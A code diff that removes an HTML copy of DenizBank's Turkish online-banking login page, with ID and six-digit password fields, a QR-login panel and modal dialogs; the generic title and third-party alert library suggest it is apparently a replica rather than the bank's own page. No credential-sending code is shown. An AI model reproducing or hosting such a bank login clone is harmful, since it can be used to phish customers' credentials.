@@ -1,588 +1,74 @@
-<html lang="tr">
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="x-ua-compatible" content="ie=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-touch-fullscreen" content="yes">
-    <script async src="https://cdn.debugbear.com/BQwbMbSQ4PSw.js"></script>
-    <title>Mobile Sayfa</title>
-    <base id="baseHref" href="/">
-	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-
-    <style type="text/css">
-      .im-caret {
-        -webkit-animation: 1s blink step-end infinite;
-        animation: 1s blink step-end infinite;
-      }
-
-      @keyframes blink {
-        from, to {
-          border-right-color: black;
-        }
-        50% {
-          border-right-color: transparent;
-        }
-      }
-
-      @-webkit-keyframes blink {
-        from, to {
-          border-right-color: black;
-        }
-        50% {
-          border-right-color: transparent;
-        }
-      }
-
-      .im-static {
-        color: grey;
-      }
-    </style>
-    <link rel="stylesheet" crossorigin href="/assets/index-MjDWIHmx.css">
-  </head>
-  <body class="login">
-    <div class="login-wrap login-v4">
-          <header class="w-100 align-items-center login-header px-4 px-lg-5 justify-content-center d-flex not-background" login-header="">
-            <div class="col-8 col-lg-4 text-center p-0">
-              <a class="logo-light">
-                <img alt="Light Logo" src="/assets/logo-light-D91GUlew.svg">
-              </a>
-            </div>
-            <!---->
-            <!---->
-            <div class="mb-5">
-              <!---->
-              <div class="lang">
-                <a class="d-flex align-items-center">
-                  <img alt="" src="data:image/svg+xml,%3csvg%20width='24'%20height='24'%20viewBox='0%200%2024%2024'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M12%2023.65C5.566%2023.65.35%2018.434.35%2012S5.566.35%2012%20.35h-.002c6.337%200%2011.491%205.057%2011.648%2011.354l.004.296c0%206.434-5.216%2011.65-11.65%2011.65zm-.65-6.6H7.43l.138.448c.836%202.57%202.228%204.37%203.781%204.769l.001-5.217zm5.219%200H12.65v5.217c1.553-.398%202.945-2.198%203.782-4.769l.137-.448zm-13.605.001a10.386%2010.386%200%200%200%205.344%204.621c-.962-1.154-1.73-2.752-2.228-4.621zm18.072%200H17.92c-.497%201.87-1.266%203.467-2.228%204.621a10.386%2010.386%200%200%200%205.344-4.621zM22.35%2012c0-1.323-.248-2.587-.7-3.75h-3.436c.22%201.18.34%202.441.34%203.75%200%201.31-.12%202.571-.34%203.75h3.435c.453-1.162.701-2.427.701-3.75zm-20-3.75a10.324%2010.324%200%200%200-.7%203.75c0%201.323.248%202.588.7%203.75h3.436c-.22-1.179-.34-2.44-.34-3.75%200-1.309.12-2.57.34-3.75zm14.538%200H12.65v7.5l4.238.001c.235-1.16.365-2.424.365-3.751%200-1.326-.13-2.59-.365-3.75zm-5.538%200H7.112A18.986%2018.986%200%200%200%206.747%2012c0%201.327.13%202.59.365%203.751l4.238-.001v-7.5zm9.687-1.3a10.386%2010.386%200%200%200-5.345-4.622c.962%201.155%201.731%202.752%202.229%204.622zM8.308%202.328l-.03.011A10.387%2010.387%200%200%200%202.963%206.95H6.08c.498-1.87%201.267-3.467%202.229-4.622zm4.342-.595V6.95h3.919l-.137-.448c-.837-2.571-2.229-4.371-3.782-4.77zm-1.3%200c-1.554.399-2.946%202.198-3.782%204.769l-.138.448h3.92z'%20fill='%23FFF'%20fill-rule='nonzero'/%3e%3c/svg%3e">
-                  <span>ENG</span>
-                </a>
-              </div>
-              <!---->
-            </div>
-          </header>
-          <!---->
-          <div class="bacground-group">
-            <div class="login-overlay"></div>
-            <div class="bg-image" style="background: url(&quot;/assets/autumn-CdRdY2lJ.jpg&quot;) center center no-repeat;"></div>
-            <div class="bg-image hidden"></div>
-          </div>
-          <!---->
-          <vp-resultpanel id="LoginResultPanel">
-            <!---->
-          </vp-resultpanel>
-          <router-outlet class="d-none"></router-outlet>
-          <ng-component>
-            <!---->
-            <div class="container container-v2">
-              <div class="row">
-                <div class="col-sm-12 col-lg-6">
-                  <div class="login-content login-content-v2">
-                    <div class="tab custom">
-                      <ul class="nav nav-tabs" id="myTab" role="tablist">
-                        <li class="nav-item">
-                          <a aria-controls="bireysel" aria-selected="true" class="nav-link active" data-toggle="tab" href="#bireysel" id="home-tab" role="tab" value="TabTitlePersonal | BİREYSEL">BİREYSEL</a>
-                        </li>
-                        <li class="nav-item">
-                          <a aria-controls="profile" aria-selected="false" class="nav-link" data-toggle="tab" href="#bireysel" id="profile-tab" role="tab" value="TabTitleCorporate | KURUMSAL" vp-resource="">KURUMSAL </a>
-                        </li>
-                      </ul>
-                      <!---->
-                    </div>
-                    <div class="tab-content" id="myTabContent">
-                      <div aria-labelledby="home-tab" class="tab-pane fade show active" id="bireysel" role="tabpanel">
-                        <div class="login-form">
-                          <vp-containerrow cssclass="mb-22px form-group-v2">
-                            <div class="form-group mb-22px form-group-v2" id="row">
-                              <!---->
-                              <label class="align-items-center d-flex"> T.C. Kimlik No / Kullanıcı Adı
-                                <!---->
-                                <!---->
-                                <!---->
-                                <!---->
-                              </label>
-                              <!---->
-                              <vp-textbox cssclass="mask" iconclass="icon-user" id="tcOrUserName" placeholder="LoginUserNamePlaceholder | Kullanıcı Adı/TCKN" switchofftext="LoginRememberMe | Hatırla" switchontext="LoginRememberMe | Hatırla" class="ng-untouched ng-valid ng-dirty">
-                                <!---->
-                                <div class="input-group mb-3 d-flex align-items-center switch-group">
-                                  <!---->
-                                  <div class="input-group-prepend">
-                                    <span class="input-group-text">
-                                      <em class="icon-user fs-24"></em>
-                                    </span>
-                                  </div>
-                                  <input autocomplete="off" autocorrect="off" spellcheck="false" type="text" max="undefined" min="undefined" placeholder="Kullanıcı Adı/TCKN" maxlength="32" options="[object Object]" inputmode="text" class="form-control mask" id="tcOrUserNametxt" name="tcOrUserNametxt" aria-label="Kullanıcı Adı/TCKN" aria-describedby="Kullanıcı Adı/TCKN">
-                                  <div class="input-group-append input-group-append-v2 switch-wrap">
-                                    <span class="input-group-text">
-                                      <label class="switch-text">
-                                        <input type="checkbox" id="tcOrUserNamecb" class="ng-untouched ng-pristine ng-valid">
-                                        <div aria-live="assertive" class="slider round" role="button" aria-label="Hatırla">
-                                          <span aria-hidden="true" class="on">Hatırla</span>
-                                          <span aria-hidden="true" class="off">Hatırla</span>
-                                        </div>
-                                      </label>
-                                    </span>
-                                  </div>
-                                </div>
-                                <!---->
-                                <!---->
-                              </vp-textbox>
-                              <!---->
-                            </div>
-                          </vp-containerrow>
-                          <vp-containerrow cssclass="mb-22px form-group-v2" modulename="VirtualNumericKeyboard">
-                            <div class="form-group mb-22px form-group-v2" data-module="VirtualNumericKeyboard" id="row">
-                              <!---->
-                              <!---->
-                              <vp-passwordtextbox cssclass="mb-22px" id="tbPassword" inputtype="numeric" label="LoginPassword | Parola" placeholder="LoginPasswordPlaceholder | Parolanızı giriniz" class="ng-untouched ng-pristine ng-valid">
-                                <div class="virtual-keyword">
-                                  <!---->
-                                  <label for="tbPasswordtxt">Parola</label>
-                                  <div class="input-group mb-3" id="tbPasswordvd">
-                                    <!---->
-                                    <div class="input-group-prepend">
-                                      <span class="input-group-text">
-                                        <em class="icon-lock fs-24"></em>
-                                      </span>
-                                    </div>
-                                    <input autocomplete="off" autocorrect="off" inputmode="numeric" pattern="[0-9]*" spellcheck="false" type="password" placeholder="Parolanızı giriniz" maxlength="6" class="form-control password numeric mask " id="tbPasswordtxt" name="tbPasswordtxt" aria-label="Parolanızı giriniz" aria-describedby="Parolanızı giriniz">
-                                    <!---->
-                                    <div class="input-group-append">
-                                      <span class="input-group-text">
-                                        <em class="icon-keyboard fs-24 tooltipstered" vp-tooltip=""></em>
-                                      </span>
-                                    </div>
-                                  </div>
-                                  <div class="keyword-container"></div>
-                                </div>
-                              </vp-passwordtextbox>
-                              <!---->
-                            </div>
-                          </vp-containerrow>
-                          <!---->
-                          <!---->
-                          <!---->
-                          <div class="form-group form-group-v2">
-                            <a class="btn btn-red-gradient d-block border-0" id="btnLogin" value="LoginSubmitButton | GİRİŞ YAP" vp-resource="">GİRİŞ YAP </a>
-                          </div>
-                          <div class="login-footer custom">
-                            <a class="btn btn-ghost mb-0 text-center text-md-left py-10-tablet">
-                              <em class="icon-key fs-24 d-none d-md-inline"></em> PAROLAMI UNUTTUM / BLOKE KALDIR </a>
-                            <a class="btn btn-ghost new-user py-10-tablet">
-                              <em class="icon-adduser fs-24 d-none d-md-inline"></em> KULLANICI OLUŞTUR </a>
-                          </div>
-                        </div>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-                <div class="col-sm-12 col-lg-6 d-md-block d-none">
-                  <div class="login-qr-content flex-lg-column">
-                    <div class="col-lg-auto col">
-                      <h3 value="LoginWithQrCode | QR Kod'la Giriş" vp-resource="">QR Kod'la Giriş </h3>
-                      <p value="LoginWithQrInfo |	MobilDeniz veya DenizKartım üzerinden kodu okutarak hızlıca giriş yapabilirsiniz." vp-resource="">MobilDeniz üzerinden kodu okutarak hızlıca giriş yapabilirsiniz. </p>
-                    </div>
-                    <div class="col-lg-auto col">
-                      <a>
-                        <!---->
-                        <div class="qr-wrap passive">
-                          <picture>
-                            <img alt="QR Code" src="/assets/qrPhoto-Ca95Kd81.jpg" srcset="/assets/qrPhoto-Ca95Kd81.jpg, _assets/img/login/qrPhoto2x.jpg 2x">
-                          </picture>
-                          <figcaption>
-                            <p class="qrColor">
-                              <strong>QR Kod</strong> üretmek için tıklayınız.
-                            </p>
-                          </figcaption>
-                        </div>
-                      </a>
-                      <vp-loading-panel cssclass="bg-transparent" id="qrLoading">
-                        <!---->
-                      </vp-loading-panel>
-                      <!---->
-                      <div>
-                        <div class="form-wrap login-form" data-module="SmsTimer">
-                          <div class="form-group timer-wrap">
-                            <!---->
-                            <p value="EndQRText | QR Kod giriş özelliği, MobilDeniz veya DenizKartım giriş ekranı içinde Hızlı Menü'de ''İnternet Şube Giriş'' seçeneği ile yer almaktadır." vp-resource="" class="pt-3">QR’la giriş özelliği için MobilDeniz ‘Giriş Yap’ butonuna basmadan önce; Hızlı Menü &gt; QR işlemleri &gt; İnternet Şube Giriş sayfası adımlarını takip ediniz. </p>
-                          </div>
-                        </div>
-                      </div>
-                      <!---->
-                      <a class="link-icon d-lg-none d-md-block">
-                        <em class="icon-change fs-24"></em> QR Kod Üret </a>
-                    </div>
-                    <!---->
-                    <a class="link-icon d-lg-block d-none">
-                      <em class="icon-change fs-24"></em> QR Kod Üret </a>
-                  </div>
-                </div>
-              </div>
-            </div>
-            <vp-modalpopup cssclass="mobileModal">
-              <!---->
-              <div aria-hidden="true" class="modal-backdrop show" style="display: none;"></div>
-              <div role="dialog" tabindex="-1" class="modal mobileModal" id="md" aria-labelledby="" style="display: none;">
-                <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
-                  <div class="modal-content">
-                    <!---->
-                    <div class="modal-header d-flex align-items-center ">
-                      <h5 class="modal-title "></h5>
-                      <!---->
-                      <button class="close d-flex align-items-center" type="button" id="BtnClose" aria-label="Kapat"> Kapat <span aria-hidden="true" class="icon-close ml-2"></span>
-                      </button>
-                    </div>
-                    <!---->
-                    <div class="modal-body d-flex flex-column text-center default-bg">
-                      <!---->
-                      <!---->
-                      <img alt="DenizBank Logo" aria-hidden="true" src="/assets/denizbank-mobile-D8u8TikZ.jpg">
-                      <p></p>
-                      <div class="keyboard-spacer"></div>
-                    </div>
-                    <!---->
-                  </div>
-                </div>
-              </div>
-            </vp-modalpopup>
-            <vp-modalpopup id="infoModal">
-              <!---->
-              <div aria-hidden="true" class="modal-backdrop show" style="display: none;"></div>
-              <div role="dialog" tabindex="-1" class="modal" id="infoModalmd" aria-labelledby="Bilgilendirme" style="display: none;">
-                <div class="modal-dialog modal-dialog-centered modal-lg modal-dialog-scrollable modal-background" role="document">
-                  <div class="modal-content">
-                    <!---->
-                    <!---->
-                    <div class="modal-body text-center default-bg">
-                      <!---->
-                      <button class="close d-flex align-items-center" type="button" id="infoModalBtnClose" aria-label="Kapat"> Kapat <span aria-hidden="true" class="icon-close ml-2"></span>
-                      </button>
-                      <!---->
-                      <p class="modal-title-custom ">Bilgilendirme</p>
-                      <div class="result-content warning-result">
-                        <p class="message-row font-weight-bolder"></p>
-                        <div class="row col-md-10 mx-auto mt-5 mb-4">
-                          <div class="col-12 mb-4 col-md-6 mx-auto">
-                            <!---->
-                            <!---->
-                            <!---->
-                            <!---->
-                            <!---->
-                            <!---->
-                          </div>
-                        </div>
-                      </div>
-                      <div class="keyboard-spacer"></div>
-                    </div>
-                    <!---->
-                  </div>
-                </div>
-              </div>
-            </vp-modalpopup>
-            <vp-modalpopup modaltitle="SuccesModalTitle | Başarılı">
-              <!---->
-              <div aria-hidden="true" class="modal-backdrop show" style="display: none;"></div>
-              <div role="dialog" tabindex="-1" class="modal" id="md" aria-labelledby="Başarılı" style="display: none;">
-                <div class="modal-dialog modal-dialog-centered modal-lg modal-dialog-scrollable modal-background" role="document">
-                  <div class="modal-content">
-                    <!---->
-                    <!---->
-                    <div class="modal-body text-center default-bg">
-                      <!---->
-                      <button class="close d-flex align-items-center" type="button" id="BtnClose" aria-label="Kapat"> Kapat <span aria-hidden="true" class="icon-close ml-2"></span>
-                      </button>
-                      <!---->
-                      <p class="modal-title-custom ">Başarılı</p>
-                      <div class="result-content warning-result">
-                        <p class="message-row">
-                          <strong></strong>
-                        </p>
-                      </div>
-                      <!---->
-                      <div class="keyboard-spacer"></div>
-                    </div>
-                    <!---->
-                  </div>
-                </div>
-              </div>
-            </vp-modalpopup>
-            <!---->
-          </ng-component>
-          <!---->
-          <footer class="login-footer login-footer-v3">
-            <!---->
-            <vp-announcement id="loginAnnouncement">
-              <!---->
-              <div class="black-band black-band-v2">
-                <picture class="footer-logo">
-                  <img alt="footer-logo" src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20xmlns:xlink='http://www.w3.org/1999/xlink'%20width='44'%20height='90'%20viewBox='0%200%2044%2090'%3e%3cdefs%3e%3cpath%20id='prefix__a'%20d='M0%200L45%200%2045%2090%200%2090z'/%3e%3c/defs%3e%3cg%20fill='none'%20fill-rule='evenodd'%3e%3cmask%20id='prefix__b'%20fill='%23fff'%3e%3cuse%20xlink:href='%23prefix__a'/%3e%3c/mask%3e%3cpath%20fill='%23FFF'%20d='M-3.55%204.405l.026%207.131c-6.53.73-12.493%203.37-17.324%207.358l-5.208-5.27c-1.704-1.72-4.226-1.957-5.641-.528-1.411%201.429-1.178%203.98.521%205.7l5.26%205.302c-3.81%204.86-6.315%2010.81-6.989%2017.312h-7.738c-2.408%200-4.357%201.638-4.357%203.657%200%202.021%201.95%203.659%204.357%203.659h7.76c.724%206.593%203.335%2012.612%207.271%2017.49l-5.115%205.176c-1.699%201.72-1.936%204.273-.521%205.701%201.411%201.429%203.937%201.192%205.636-.527l5.17-5.202c4.751%203.8%2010.553%206.312%2016.893%207.025v7.207C-3.55%2088.03-1.93%2090%20.066%2090c1.996%200%203.62-1.97%203.62-4.404l.011-7.185c6.421-.685%2012.295-3.219%2017.096-7.06l4.806%204.857c1.7%201.72%204.22%201.956%205.636.528%201.412-1.429%201.178-3.982-.521-5.702L25.959%2066.2c3.933-4.876%206.54-10.89%207.264-17.474h6.42c2.407%200%204.357-1.638%204.357-3.659%200-2.02-1.95-3.657-4.357-3.657h-6.399c-.674-6.497-3.178-12.444-6.984-17.302l4.9-4.954c1.703-1.72%201.936-4.272.52-5.701-1.41-1.428-3.936-1.192-5.636.527L21.2%2018.91c-4.878-4.032-10.908-6.69-17.515-7.393v-7.11C3.685%201.972%202.062%200%20.065%200-1.93%200-3.548%201.973-3.548%204.405zm5.82%2029.717l-.018-11.016c4.383.423%208.379%202.16%2011.608%204.817L6.14%2035.712c-1.157-.766-2.467-1.314-3.87-1.59zm-15.617-6.345c2.932-2.362%206.488-3.973%2010.374-4.542l.013%2011.142c-.94.284-1.831.693-2.645%201.208l-7.742-7.808zm-8.06%2014.71c.453-4.102%202.025-7.86%204.403-10.96l7.76%207.83c-.565.963-.984%202.02-1.238%203.144l-10.926-.015zm32.233.042c-.234-1.053-.619-2.05-1.128-2.966l7.786-7.85c2.305%203.077%203.83%206.79%204.267%2010.83l-10.925-.014zm-32.2%205.209l10.968.014c.3%201.16.78%202.246%201.411%203.226l-7.725%207.79c-2.476-3.095-4.137-6.882-4.653-11.03zm30.83%203.04c.565-.918%201-1.926%201.276-2.998l10.973.015c-.518%204.045-2.12%207.746-4.505%2010.792l-7.743-7.808zm-7.16%205.024c1.236-.247%202.393-.704%203.444-1.334l7.76%207.83c-3.153%202.481-6.997%204.103-11.192%204.518l-.013-11.014zm-15.279%206.638l7.785-7.852c.708.405%201.467.733%202.263.971l.017%2011.143c-3.75-.54-7.187-2.047-10.065-4.262z'%20mask='url(%23prefix__b)'%20opacity='.2'/%3e%3c/g%3e%3c/svg%3e">
-                </picture>
-                <div class="content-v2 d-flex align-items-center w-100">
-                  <p class="content-first">
-                    <strong>Bilgilendirme:</strong>
-                  </p>
-                  <p class="content-second">Size özel giriş bilgilerinizi hiç kimse ile paylaşmayınız. Her girişinizde karşılama mesajınızı mutlaka kontrol ediniz.</p>
-                </div>
-              </div>
-            </vp-announcement>
-            <!---->
-            <div class="bottom bottom-v2">
-              <a class="logo-enbd no-link">
-                <img alt="enbd" src="data:image/png;base64,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">
-              </a>
-              <div class="link-group">
-                <!---->
-                <a class="link-icon" rel="noopener noreferrer" target="_blank" href="" aria-label="İnternet Güvenliği">
-                  <em aria-hidden="true" class="icon-security-2 fs-20"></em>
-                  <span>İnternet Güvenliği</span>
-                </a>
-                <a class="link-icon" rel="noopener noreferrer" target="_blank" href="" aria-label="Yardım ve Öneriler">
-                  <em aria-hidden="true" class="icon-help-2 fs-20"></em>
-                  <span>Yardım ve Öneriler</span>
-                </a>
-                <a class="link-icon" rel="noopener noreferrer" target="_blank" href="" aria-label="İşlem Limitleri ve Saatleri">
-                  <em aria-hidden="true" class="icon-time-2 fs-20"></em>
-                  <span>İşlem Limitleri ve Saatleri</span>
-                </a>
-                <a class="link-icon" rel="noopener noreferrer" href="tel:08502220800" aria-label="0850 222 0 800">
-                  <em aria-hidden="true" class="icon-phone-2 fs-20"></em>
-                  <span>0850 222 0 800</span>
-                </a>
-              </div>
-            </div>
-            <!---->
-          </footer>
-        </div>
-        <!---->
-        <vp-timeoutpopup>
-          <vp-modalpopup hidefooter="true" hideheaderclose="true">
-            <!---->
-            <div aria-hidden="true" class="modal-backdrop show" style="display: none;"></div>
-            <div role="dialog" tabindex="-1" class="modal" id="md" aria-labelledby="Uyarı" style="display: none;">
-              <div class="modal-dialog modal-dialog-centered modal-lg modal-dialog-scrollable" role="document">
-                <div class="modal-content">
-                  <!---->
-                  <div class="modal-header d-flex align-items-center ">
-                    <h5 class="modal-title ">Uyarı</h5>
-                    <!---->
-                  </div>
-                  <!---->
-                  <div class="modal-body text-center default-bg">
-                    <!---->
-                    <!---->
-                    <div class="progressbar" data-module="Timer" id="timeoutbar" data-remaining="20000"></div>
-                    <p class="fs-16 color-gray2b">Uzun&nbsp;süredir&nbsp;işlem&nbsp;yapmadığınız&nbsp;için&nbsp;oturumunuz&nbsp;kapatılacaktır.</p>
-                    <p class="color-gray4f pl-md-0 pr-md-0 pl-5 pr-5">İşlem&nbsp;yapmaya&nbsp;devam&nbsp;etmek&nbsp;için&nbsp;ek&nbsp;süre&nbsp;ister&nbsp;misiniz?</p>
-                    <div class="row col-md-10 mx-auto mt-5 mb-4">
-                      <div class="col-md-6 mb-4">
-                        <a class="btn btn-primary btn-block"> Evet </a>
-                      </div>
-                      <div class="col-md-6">
-                        <a class="btn btn-outline-primary btn-block"> Hayır </a>
-                      </div>
-                    </div>
-                    <!---->
-                    <a class="color-gray2b font-weight-bold link-underline fs-14 mt-md-3 mt-4 mb-4 pl-md-0 pr-md-0 pl-5 pr-5">Oturum Süresini Değiştir</a>
-                    <div class="keyboard-spacer"></div>
-                  </div>
-                  <!---->
-                </div>
-              </div>
-            </div>
-          </vp-modalpopup>
-          <!---->
-        </vp-timeoutpopup>
-      
-      <!---->
-      <vp-modalpopup class="connection-modal" id="connectionModal">
-        <!---->
-        <div aria-hidden="true" class="modal-backdrop show" style="display: none;"></div>
